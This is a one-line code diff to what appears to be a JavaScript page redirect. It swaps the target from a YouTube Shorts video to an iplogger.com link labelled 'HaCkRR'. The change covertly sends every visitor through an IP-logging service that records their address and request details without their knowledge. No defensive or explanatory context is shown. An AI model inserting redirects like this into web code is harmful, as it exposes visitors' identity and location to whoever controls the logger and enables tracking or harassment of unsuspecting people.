@@ -1,1 +1,1 @@
-window.location.replace("https://www.youtube.com/shorts/qu0gJjJI3Bs");
+window.location.replace("https://iplogger.com/HaCkRR");
